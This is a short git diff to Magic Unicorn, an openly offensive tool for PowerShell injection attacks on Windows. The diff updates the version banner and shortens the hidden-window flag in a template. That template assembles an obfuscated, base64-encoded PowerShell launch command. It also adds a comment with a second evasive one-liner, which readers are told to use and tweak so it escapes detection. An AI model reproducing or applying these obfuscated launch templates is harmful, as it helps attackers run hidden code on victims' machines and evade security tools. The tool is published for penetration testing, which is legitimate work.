@@ -195,7 +195,7 @@ The last one will use a 500 character string instead of the default 380, resulti
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v2.4.1 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v2.4.2 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -394,9 +394,9 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
     ran3 = generate_random_string(1, 2)
     ran4 = generate_random_string(1, 2)
 
-
+    # powershell -w 1 -C "powershell ([char]45+[char]101+[char]99) YwBhAGwAYwA="  <-- Another nasty one that should evade. If you are reading the source, feel free to use and tweak
     #"sv x -;sv y ec;sv Z ((gv x).value.toString()+(gv y).value.toString());powershell (gv Z).value.toString()"
-    full_attack = 'powershell -window hidden -C "sv %s -;sv %s ec;sv %s ((gv %s).value.toString()+(gv %s).value.toString());powershell (gv %s).value.toString() "' % (ran1, ran2, ran3, ran1, ran2, ran3) + \
+    full_attack = 'powershell -w 1 -C "sv %s -;sv %s ec;sv %s ((gv %s).value.toString()+(gv %s).value.toString());powershell (gv %s).value.toString() "' % (ran1, ran2, ran3, ran1, ran2, ran3) + \
         base64.b64encode(powershell_code.encode('utf_16_le')) + '"'
 
     if attack_type == "msf":
